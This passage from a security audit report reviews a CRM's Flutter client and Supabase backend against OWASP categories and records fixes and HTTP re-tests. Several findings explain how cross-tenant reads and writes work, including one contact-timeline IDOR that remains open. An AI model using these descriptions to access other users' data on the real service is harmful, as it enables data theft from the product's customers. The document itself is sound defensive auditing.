[exono/lib/db/tables/](exono/lib/db/tables/) — `contacts_table`, `companies_table`, `interactions_table`, `email_drafts_table`, etc. The full CRM dataset (names, emails, phones, company intel, interaction notes, AI email drafts) is mirrored offline in a plain SQLite/Drift DB with no encryption. Also relevant to **M6: Inadequate Privacy Controls** (PII at rest).
**Fix:** use SQLCipher (`sqflite_sqlcipher` / Drift encrypted executor), with the DB key held in secure storage.

---

## 🟠 High

### C3. Malformed base URL — no scheme → broken transport — M5: Insecure Communication — ✅ **FIXED 2026-06-25**
> [api_config.dart](exono/lib/config/api_config.dart) default is now `https://exhibitioncrm.vercel.app/api`, and `ApiConfig.assertSecure()` (called from [main.dart](exono/lib/main.dart)) asserts the configured base URL parses as an absolute `https://` URL at startup. Also restores the missing `/api` path prefix.

### C3 (original)
[api_config.dart:5](exono/lib/config/api_config.dart#L5): `defaultValue: 'exhibitioncrm.vercel.app'` (no `https://`).
Verified: `Uri.parse('exhibitioncrm.vercel.app/auth/login')` yields `scheme="" host="" path="exhibitioncrm.vercel.app/auth/login"` — a relative URI with no host. Production requests don't get an explicit HTTPS host; the `/api` path prefix is also missing vs the commented localhost default. No guarantee of TLS, and likely a functional break on native.
**Fix:** `defaultValue: 'https://exhibitioncrm.vercel.app/api'`; assert the scheme is `https` at startup.

### C4. No certificate pinning + cleartext not explicitly disabled — M5: Insecure Communication — 🟡 **PARTIALLY FIXED 2026-06-25**
> ✅ `android:usesCleartextTraffic="false"` now set on the `<application>` in [AndroidManifest.xml](exono/android/app/src/main/AndroidManifest.xml). ✅ iOS has no `NSAppTransportSecurity`/`NSAllowsArbitraryLoads` override, so ATS default-deny (cleartext blocked) is already in force — left as-is intentionally. ⚠️ **Cert pinning NOT added** — still recommended for the API host given the PII threat model.

### C4 (original)
No `usesCleartextTraffic="false"` / network-security-config in [AndroidManifest.xml](exono/android/app/src/main/AndroidManifest.xml), no `NSAppTransportSecurity` block in iOS `Info.plist`, and no TLS pinning. MITM on a hostile network is in scope for a CRM holding customer PII.
**Fix:** set `android:usesCleartextTraffic="false"` (or a network-security-config disallowing cleartext), keep ATS default-deny on iOS, consider cert pinning on the API host.

---

## 🟡 Medium

### C5. `url_launcher` opens server-controlled URLs unvalidated — M4: Insufficient Input/Output Validation — ✅ **FIXED 2026-06-25**
> Both `_launchUrl` ([contact_detail_screen.dart](exono/lib/screens/contact_detail_screen.dart)) and `_openAsset` ([contact_links_files_sheet.dart](exono/lib/screens/contact_links_files_sheet.dart)) now reject any URI whose scheme is not in `{http, https, mailto, tel}` before calling `launchUrl`, so `javascript:`/`intent:`/`file:` from server or import data can no longer be launched.

### C5 (original) — **Re-verified (2026-06-24)**
Two call sites pass a raw `Uri.tryParse(...)` straight into `launchUrl(..., LaunchMode.externalApplication)` with **no scheme allowlist**, on strings that originate from backend/import data:
- [contact_detail_screen.dart:146](exono/lib/screens/contact_detail_screen.dart#L146) `_launchUrl` — used for `contact.linkedinUrl` etc.
- [contact_links_files_sheet.dart:242](exono/lib/screens/contact_links_files_sheet.dart#L242) `_openAsset` — launches `asset.url` directly.

A malicious imported contact/asset could carry `javascript:`, `intent:`, or `file:` schemes.
**Note:** [company_detail_screen.dart:94](exono/lib/screens/company_detail_screen.dart#L94) is *not* affected — it prepends `https://` when the string doesn't start with `http`, which neutralizes non-http schemes. The two sites above have no such guard.
**Fix:** validate `uri.scheme ∈ {http, https, mailto, tel}` before launching, in both `_launchUrl` and `_openAsset`.

### C6. Firebase API keys committed in source — informational — M1: Improper Credential Usage
[firebase_options.dart:44-80](exono/lib/firebase_options.dart#L44-L80) — these `AIza...` keys are **client identifiers, not secrets** (Google ships them in apps by design), so not a leak by itself. **But** Firebase security then depends entirely on backend rules + key restrictions. Verify: (a) Firebase Security Rules are locked down, (b) keys are restricted by app package/SHA in the Google Cloud console. If rules are open, this becomes critical.

### C7. CSV/file import sent without client-side type/size validation — M4 / (server: A03/A05:2025)
[api_service.dart:744-776](exono/lib/services/api_service.dart#L744-L776) (`importEventTargets`, `importContacts`) — raw `Uint8List` is multipart-posted with no size cap or content-type check. The server parses it with the vulnerable `xlsx` lib (B3/B10).
**Fix:** cap size / check extension client-side; harden the server parser.

### C8. No binary hardening / tamper detection — M7: Insufficient Binary Protections (informational)
No evidence of code obfuscation, root/jailbreak detection, or integrity checks. For a CRM this is lower priority than C1/C2 but worth noting under the 2024 mobile list, especially given secrets like Firebase keys ship in the binary.
**Fix (optional):** build with `--obfuscate --split-debug-info`; consider root/jailbreak detection if threat model warrants.

### C9. Offline session restore from cached identity — M9: Insecure Data Storage / M1: Improper Credential Usage — 🟡 **MITIGATED IN CODE 2026-06-26; cache-at-rest hardening still OPEN**
> **Context — why this exists.** Previously, resuming the app while offline logged the user out: `AuthProvider.initialize()` called `getSession(token)`, the network call failed, and the failure was indistinguishable from a rejected token, so it fell through to `_clearSession()`. Since you cannot log in while offline, this stranded offline users. The fix (2026-06-26) restores an authenticated session from cached identity when — and only when — the session check failed due to *no connectivity*, not a server rejection.
>
> **Threat model — what this does and does NOT grant.** Offline-restore grants **no new access to server data**: the backend `requireAuth` ([requireAuth.ts](backend/src/middleware/requireAuth.ts)) re-verifies the token via `supabaseAuth.auth.getUser()` and 401s any expired/revoked/invalid token on the next online request — so every real fetch/write is still server-enforced. The cached token was already in `SharedPreferences` before this change (cf. **C1**), so an attacker with the device gained nothing new there. The one *new* exposure it could have introduced is **indefinite offline access**: a stolen device kept in airplane mode reading cached CRM data / queuing writes forever with a dead session.
>
> **Controls enforced in code** ([auth_provider.dart](exono/lib/providers/auth_provider.dart), [auth_service.dart](exono/lib/services/auth_service.dart)):
> - **Network vs. rejection is explicit, not inferred.** `getSession`/`refresh` tag genuine network failures with `'network': true`. A server rejection (`success:false` *without* the flag) still routes straight to `_clearSession()` → logout. Only a true offline failure keeps the session.
> - **Offline grace window** (`_offlineGraceDuration = 7 days`). Every *confirmed server verification* stamps `session_last_verified_ms`. Offline restore is refused once that timestamp is older than the window, bounding how long a device can stay authenticated without ever reaching the server. Tune to risk appetite.
> - **Fail closed.** Missing/garbled timestamp ⇒ no restore. Negative elapsed time (clock rolled back to dodge the cap) ⇒ no restore.
> - **Full teardown on logout / real 401.** `_clearSession` removes `cached_user`, `cached_profile`, and `session_last_verified_ms` alongside the tokens; `onUnauthorized` (a real server 401) still forces logout.
> - **Deliberate non-control:** the *access* token's `exp` is NOT hard-gated, because access tokens are ~1h and cannot be refreshed offline — enforcing it would break legitimate offline use after an hour. The grace window is the lifetime control instead.
>
> **Residual risk — STILL OPEN (this is the `flutter_secure_storage` follow-up):**
> - `cached_user` / `cached_profile` live in **plaintext `SharedPreferences`** and are attacker-writable on a rooted device or via backup extraction (same root cause as **C1** tokens / **C2** offline DB). Tampering impact is currently limited to **client-side navigation** (e.g. flipping `onboarding_completed` to skip an onboarding screen) — it grants **zero** server access, since the backend never trusts client state. But it is unverified trust at rest.
> - The `session_last_verified_ms` timestamp is likewise plaintext and editable, so a determined local attacker can extend the offline grace window by rewriting it. The grace window is a *speed bump*, not a cryptographic control.
> **Fix (follow-up):** move tokens **and** the auth identity cache (`cached_user`, `cached_profile`, `session_last_verified_ms`) into `flutter_secure_storage` (Keychain / Android Keystore-backed `EncryptedSharedPreferences`). This is the same remediation as **C1** and should be done together — once the cache is integrity-protected at rest, the tamper residue above closes too. Larger change (touches every read/write of these keys); flagged, not yet done.

---

# Good practices observed 🟢

**Backend**
- All tables have RLS enabled (right baseline; load-bearing for the `conversations` path).
- `helmet()` applied; JSON body capped at 2 MB.
- Strong **Zod validation** on most write bodies (length caps, email/URL/UUID formats) — strong mitigation for A05:2025 Injection.
- `conversations.ts` correctly uses the **RLS-enforcing user client** — the model to extend everywhere.
- UUID validation on many `:id` params.
- `package-lock.json` committed → dependencies pinned (helps A03:2025).
- `.env` files are **not** committed (only `.env.example` tracked; `backend/.gitignore` covers `.env`).
- Request logging middleware present (A09 baseline; needs alerting added).

**Client**
- 401 handling is centralized via `checkUnauthorized` → forced logout ([api_service.dart:17-22](exono/lib/services/api_service.dart#L17-L22)).
- No sensitive logging (no `print`/`debugPrint` of tokens or response bodies found).
- Idempotency keys on mutating POSTs.
- `.env` gitignored; Supabase config injected via `--dart-define`.
- Query params encoded with `Uri.encodeComponent`.

---

# Remediation priority

1. ~~**B1 / B5 / B6 — Broken Access Control + mass-assignment (A01:2025).**~~ ✅ **DONE 2026-06-24** via the RLS migration (B1/B5 closed structurally by the user client; B6 by an allowlist Zod schema) — see "Remediation applied". The migration also uncovered and fixed **B12** (`contact_events` `{public}` allow-all policy). **B2 (companies write authorization) is NOT done** — see item 1b. Remaining A01 priority is now B2.
1b. **B2 — `companies` write authorization (A01:2025).** Still open. Reads are RLS-scoped but `POST`/`PATCH /companies` run as service_role with no linkage check — any user can poison any company. Decide shared-reference-with-controlled-writes vs per-tenant `user_id`, then enforce it.
2. **B3 — Patch the supply chain (A03:2025).** `npm audit fix` for `ws`; replace/pin `xlsx`; add audit to CI. (Reachable via import path.)
3. **C1 / C2 / C9 — Encrypt tokens, the auth identity cache, and the offline DB** on the client (`flutter_secure_storage` + SQLCipher). C9 (offline session restore) is mitigated in code via a network-vs-rejection split + a 7-day offline grace window, but the cached identity/timestamp it relies on are still plaintext — move them into secure storage alongside the C1 tokens.
4. **C3 — Fix the base URL scheme** (also a functional bug) and assert HTTPS.
5. **B4 / B8 — Stop leaking error details; fail-closed CORS (A10:2025).**
6. **B9 / B10 — Revoke the public RPC; lock the avatars bucket (A02:2025)** (one-line Supabase changes each).
7. **C4 — Disable cleartext / add ATS; evaluate cert pinning (M5).**
8. **B11 — Add rate limiting + abuse alerting; enable leaked-password protection (A07/A09:2025).**
9. **B7 — Harden LLM prompts (A05:2025)** once B1 is closed.
10. **H1 — Add security headers to the web frontend deployment (A02:2025).** The API headers (helmet) are fine; the served HTML app has none — add `vercel.json`/`_headers` with CSP, HSTS, X-Frame-Options, etc.
11. **H2 — Neutralize CSV formula injection in `/export/csv` (A05:2025).** Quote all fields and prefix `= + - @` values.
10. **C5 / C6 / C7 / C8 — URL scheme validation; confirm Firebase rules; cap import size; optional binary hardening.**

---

# Items requiring further verification

- **Broken Access Control (A01:2025)** — re-audit progress (2026-06-24): `events.ts` (now guarded by `router.param`), `contacts.ts` (timeline open — B1), `followUps.ts` (B6 mass-assignment), and the `events follow-ups` write (B5) have been verified. Still to trace: `captures.ts`, `interactions.ts`, `dashboard.ts`, `emails.ts`, `documents.ts`, `export.ts`, `sync.ts`. `captures.ts POST` also reads an `event_id` from the body to fetch an event name with no `user_id` filter (minor cross-tenant name leak — low impact, worth scoping).
- **SSRF (now under A01:2025):** enrichment/Tavily and any URL-fetching server code (`enrichment-service.ts`, company `website` fetches) should be checked for server-side request forgery — not yet reviewed.
- **Full `npm audit` triage** — 15 findings total; only the 2 reachable highs detailed. Run `npm audit` and review the remaining moderates.
- **Firebase Security Rules** and Google Cloud API-key restrictions (see C6).
- **CSV formula-injection** handling and row/size caps in `import.ts`.

---

## Re-review — 2026-06-24 (security-review skill, full frontend + backend pass)

This pass independently re-traced the backend route layer and the Flutter client. It **confirms** some prior findings, **retracts** one, and adds confidence notes. Only HIGH-confidence, exploitable items are reported.

### Confirmed findings

#### [R-01] IDOR — contact timeline & sub-resources not ownership-scoped 🟠 High
- **Location:** `backend/src/routes/contacts.ts:358` (`GET /api/contacts/:id/timeline`)
- **OWASP:** A01:2025 Broken Access Control (matches prior **B1**)
- **Issue:** `contacts.ts` has **no `router.param('id')` ownership guard** (unlike `events.ts`). The timeline handler queries `interactions` and `captures` filtered only by `contact_id = req.params.id` using the **service-role** `supabase` client, which bypasses RLS. No `user_id` check is performed.
- **Impact:** Any authenticated user can read another user's full contact interaction history / captures (notes, summaries, image URLs) by supplying a victim's contact UUID.
- **Fix:** Add a `router.param('id', …)` guard to `contacts.ts` mirroring the one in `events.ts:69` (look up the contact, 404 if missing, 403 if `user_id !== req.user.id`), or add an explicit ownership pre-check in `/:id/timeline` before querying child tables. Note `/:id`, `/:id/insights`, `/:id/events`, PATCH/PUT/DELETE already scope by `user_id`; the timeline route is the gap.

#### [R-02] Cross-tenant event-name leak in capture creation 🟡 Medium — ✅ **FIXED 2026-06-25 (HTTP pen-tested)**
> The event-name lookup in [captures.ts](backend/src/routes/captures.ts) now adds `.eq('user_id', req.user!.id)`. **But HTTP pen-testing revealed the name leak was the lesser problem:** `POST /captures` with a foreign `event_id` still *succeeded* (200) and created B's capture attached to A's event — RLS on `captures` only checks the new row's own `user_id`, not the foreign `event_id`. Added an explicit event-ownership precheck (403 if the caller doesn't own `event_id`). **Re-tested over HTTP as tenant B vs A: was 200 + cross-tenant capture created → now 403, no row created. Happy path (A on own event): 200.** Original below.

- **Location:** `backend/src/routes/captures.ts:122-129`
- **OWASP:** A01:2025 Broken Access Control
- **Issue:** `event_id` is taken from the request body and used to fetch an event's `name` with no `user_id` filter on the service-role client. A user can resolve another tenant's event name by guessing its UUID.
- **Impact:** Low — leaks only an event name. Worth scoping the lookup with `.eq('user_id', req.user!.id)`.

#### [R-04] Cross-tenant foreign-key writes on event/contact link routes 🟠 High — ✅ **FIXED 2026-06-25 (HTTP pen-tested)** — NEW, found by class-sweep
- **Discovered while sweeping the class** that R-02 belongs to: *a body-supplied foreign key inserted under RLS that only checks the new row's own `user_id`, never the foreign key.* Three routes were confirmed exploitable over HTTP (tenant B vs A), all returning 200 + a real cross-tenant row before the fix:
  - `POST /contacts/:id/events` ([contacts.ts](backend/src/routes/contacts.ts)) — checked contact ownership but not the body `event_id`; B could link its contact to A's event (creates an `event_link` interaction referencing A's event).
  - `POST /events/:id/contacts` and `POST /events/:id/targets/:targetId/contacts` ([events.ts](backend/src/routes/events.ts)) — `:id` event is param-guarded, but the body `contact_id` was unchecked; B could insert A's contact into B's `contact_events`.
- **Root cause:** identical to R-02 and the original B5 — RLS `WITH CHECK (user_id = auth.uid())` validates the *row's* owner, not foreign references. Read-scoping ≠ write protection, and per-row RLS ≠ foreign-key authorization.
- **Fix:** explicit ownership precheck of the body-supplied foreign key (event_id / contact_id) before each insert; 403 otherwise.
- **Re-tested over HTTP:** all three → 403, no cross-tenant row; happy paths (own contact ↔ own event, both routes) → 200.
- **Siblings checked & found already-safe:** `documents.ts` and `attachments.ts` POST already guard the body `contact_id` via `ownsContact`. `assistant.ts` inserts run as admin but set `user_id` from the server session and the agent path has its own ownership checks (per prior review).

### Retraction / correction

#### [R-03] events.ts `:id` sub-routes are NOT vulnerable — prior concern withdrawn 🟢
- During this pass the many `event_id = req.params.id` queries in `events.ts` (`/:id/stats`, `/:id/targets`, `/:id/live`, `/:id/goals*`, `/:id/targets/import`, etc.) initially looked like IDOR because they use the service-role client without an inline `user_id` filter.
- **They are protected** by `router.param('id', …)` at `events.ts:69`, which runs before every `:id` route and returns 403 unless `event.user_id === req.user.id`. Confirmed by reading the guard. This matches the prior note that `events.ts` is "guarded by `router.param`."

### Areas reviewed and found OK (defense verified)

- **Auth middleware** (`requireAuth.ts`) — validates Bearer token via `supabaseAuth.auth.getUser()`; sound. `routes/index.ts` applies it to all non-auth routes.
- **Two-client split** (`supabaseClients.ts`) — admin (service-role) vs auth (anon) separation is correct; auth ops never run `.from()` on the admin client.
- **Assistant agent** (`assistant.ts`) — write tools (`execCreateContact/UpdateContact/Event/DraftEmail`) all enforce `user_id` ownership; immutable-field stripping (`stripImmutable`) prevents LLM mass-assignment of `user_id`/`id`. Read path goes through Slayer.
- **Slayer client** (`slayer-client.ts`) — model allowlist, Zod shape validation, `user_id` ownership + `deleted_at` injection, hallucinated `user_id` filters stripped; Slayer connects read-only with RLS as second check. `userId` is a server-validated UUID (no injection into the concatenated `user_id = '…'` filter). Solid defense-in-depth.
- **Conversations/messages** (`conversations.ts`) — uses `createSupabaseUserClient` (RLS-enforced), not the admin client. Safe.
- **Secrets** — `.env`, `backend/.env`, `backend/src/.env` are **not** git-tracked (gitignored). Request logger redacts `password`/`token`/`refresh_token`. No service-role key in the Flutter client (`supabase_config.dart` uses anon key from `String.fromEnvironment`).
- **Firebase apiKeys** in `exono/lib/firebase_options.dart` are public client identifiers, not secrets — not a finding (harden via Firebase Security Rules + API-key restrictions instead, per prior C6).
- **Service URLs** (Tavily, LiteLLM/Gemini, Slayer) are constants or env-sourced — no user-controlled outbound URL, so no SSRF in these paths.
- **CORS/helmet** — `helmet()` enabled; CORS uses an allowlist (`ALLOWED_ORIGINS`) but allows no-origin requests (mobile/curl) by design.

### Outstanding (not re-verified this pass)
- SSRF in `enrichment-service.ts` / company `website` fetches (if any server-side fetch of user-supplied URLs exists).
- `npm audit` dependency triage.
- CSV formula-injection on import/export.
